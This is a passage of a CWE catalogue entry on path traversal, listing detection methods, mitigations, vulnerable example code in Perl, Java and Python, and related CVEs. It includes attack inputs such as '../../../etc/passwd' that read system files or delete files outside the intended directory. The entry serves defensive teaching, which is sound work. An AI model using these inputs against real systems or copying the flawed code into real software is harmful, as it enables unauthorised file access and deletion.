               <Description>Manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all file access operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</xhtml:p>
                  <xhtml:p>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>realpath() in C</xhtml:li>
                        <xhtml:li>getCanonicalPath() in Java</xhtml:li>
                        <xhtml:li>GetFullPath() in ASP.NET</xhtml:li>
                        <xhtml:li>realpath() or abs_path() in Perl</xhtml:li>
                        <xhtml:li>realpath() in PHP</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
                  <xhtml:p>In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-27">
               <Intro_Text>The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $dataPath = "/users/cwe/profiles";<xhtml:br/>my $username = param("user");<xhtml:br/>my $profilePath = $dataPath . "/" . $username;<xhtml:br/>
                     <xhtml:br/>open(my $fh, "&lt;", $profilePath) || ExitError("profile read error: $profilePath");<xhtml:br/>print "&lt;ul&gt;\n";<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:1em;">print "&lt;li&gt;$_&lt;/li&gt;\n";</xhtml:div>}<xhtml:br/>print "&lt;/ul&gt;\n";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends to access files such as "/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no verification of the incoming user parameter. An attacker could provide a string such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>The program would generate a profile pathname like this:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/users/cwe/profiles/../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>When the file is opened, the operating system resolves the "../" during path canonicalization and actually accesses this file:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker could read the entire text of the password file.</Body_Text>
               <Body_Text>Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-18">
               <Intro_Text>In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String filename = System.getProperty("com.domain.application.dictionaryFile");<xhtml:br/>File dictionaryFile = new File(filename);</xhtml:div>
               </Example_Code>
               <Body_Text>However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to validate a given input path by checking it against an allowlist and once validated delete the given file. In this specific case, the path is considered valid if it starts with the string "/safe_dir/".</Intro_Text>
               <Example_Code Nature="Bad" Language="Java" Demonstrative_Example_ID="SIFT-DX-4">
                  <xhtml:div>String path = getInputPath();<xhtml:br/>if (path.startsWith("/safe_dir/"))<xhtml:br/>{<xhtml:div style="margin-left:1em;">File f = new File(path);<xhtml:br/>f.delete()</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker could provide an input such as this:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>/safe_dir/../important.dat</xhtml:div>
               </Example_Code>
               <Body_Text>The software assumes that the path is valid because it starts with the "/safe_path/" sequence, but the "../" sequence will cause the program to delete the important.dat file in the parent directory</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-159">
               <Intro_Text>This script intends to read a user-supplied file from the current directory. The user inputs the relative path to the file and the script uses Python's os.path.join() function to combine the path to the current working directory with the provided path to the specified file. This results in an absolute path to the desired file. If the file does not exist when the script attempts to read it, an error is printed to the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>
                  import os<xhtml:br/>
                  import sys<xhtml:br/>
                  def main():<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                     filename = sys.argv[1]<xhtml:br/>
                     path = os.path.join(os.getcwd(), filename)<xhtml:br/>
                     try:<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        with open(path, 'r') as f:<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                           file_data = f.read()<xhtml:br/>
                           </xhtml:div>
                        </xhtml:div>
                     except FileNotFoundError as e:<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        print("Error - file not found")<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  main()
                  </xhtml:div>
               </Example_Code>
               <Body_Text>However, if the user supplies an absolute path, the os.path.join() function will discard the path to the current working directory and use only the absolute path provided. For example, if the current working directory is /home/user/documents, but the user inputs /etc/passwd, os.path.join() will use only /etc/passwd, as it is considered an absolute path. In the above scenario, this would cause the script to access and read the /etc/passwd file.</Body_Text>
               <Example_Code Nature="Good" Language="Python">
                  <xhtml:div>
                     import os<xhtml:br/>
                     import sys<xhtml:br/>
                     def main():<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        filename = sys.argv[1]<xhtml:br/>
                        path = os.path.normpath(f"{os.getcwd()}{os.sep}{filename}")<xhtml:br/>
                        try:<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                           with open(path, 'r') as f:<xhtml:br/>
                              <xhtml:div style="margin-left:1em;">
                              file_data = f.read()<xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>
                        except FileNotFoundError as e:<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                           print("Error - file not found")<xhtml:br/>
                           </xhtml:div>
                        </xhtml:div>
                     main()
                     </xhtml:div>
               </Example_Code>
               <Body_Text>The constructed path string uses os.sep to add the appropriate separation character for the given operating system (e.g. '\' or '/') and the call to os.path.normpath() removes any additional slashes that may have been entered - this may occur particularly when using a Windows path. By putting the pieces of the path string together in this fashion, the script avoids a call to os.path.join() and any potential issues that might arise if an absolute path is entered. With this version of the script, if the current working directory is /home/user/documents, and the user inputs /etc/passwd, the resulting path will be /home/user/documents/etc/passwd. The user is therefore contained within the current working directory as intended.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-45918</Reference>
               <Description>Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using "../" sequences (CWE-24)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-45918</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-20916</Reference>
               <Description>Python package manager does not correctly restrict the filename specified in a Content-Disposition header, allowing arbitrary file read using path traversal sequences such as "../"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-20916</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-31503</Reference>
               <Description>Python package constructs filenames using an unsafe os.path.join call on untrusted input, allowing absolute path traversal because os.path.join resets the pathname to an absolute path that is specified as part of the input.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31503</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-24877</Reference>
               <Description>directory traversal in Go-based Kubernetes operator app allows accessing data from the controller's pod file system via ../ sequences in a yaml file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-4053</Reference>
               <Description>a Kubernetes package manager written in Go allows malicious plugins to inject path traversal sequences into a plugin archive ("Zip slip") to copy a file outside the intended directory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-4053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3452</Reference>
               <Description>Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-10743</Reference>
               <Description>Go-based archive library allows extraction of  files to locations outside of the target folder with "../" path traversal sequences in filenames in a zip file, aka "Zip Slip"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-10743</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0467</Reference>
               <Description>Newsletter module allows reading arbitrary files using "../" sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0467</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7079</Reference>
               <Description>Chain: PHP app uses extract for register_globals compatibility layer (CWE-621), enabling path traversal (CWE-22)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-7079</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4194</Reference>
               <Description>FTP server allows deletion of arbitrary files using ".." in the DELE command.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4194</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4053</Reference>
               <Description>FTP server allows creation of arbitrary directories using ".." in the MKD command.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0244</Reference>
               <Description>FTP service for a Bluetooth device allows listing of directories, and creation or reading of files using ".." sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0244</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4013</Reference>
               <Description>Software package maintenance program allows overwriting arbitrary files using "../" sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4449</Reference>
               <Description>Bulletin board allows attackers to determine the existence of files using the avatar.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4449</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4581</Reference>
               <Description>PHP program allows arbitrary code execution using ".." in filenames that are fed to the include() function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4581</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0012</Reference>
               <Description>Overwrite of files using a .. in a Torrent file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0012</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0013</Reference>
               <Description>Chat program allows overwriting files using a custom smiley request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5748</Reference>
               <Description>Chain: external control of values for user's desired language and theme enables path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5748</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1936</Reference>
               <Description>Chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1936</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Insecure Direct Object Reference</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO02-C</Entry_ID>
               <Entry_Name>Canonicalize path names originating from untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS00-PL</Entry_ID>
               <Entry_Name>Canonicalize path names before validating them</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>33</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-22</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
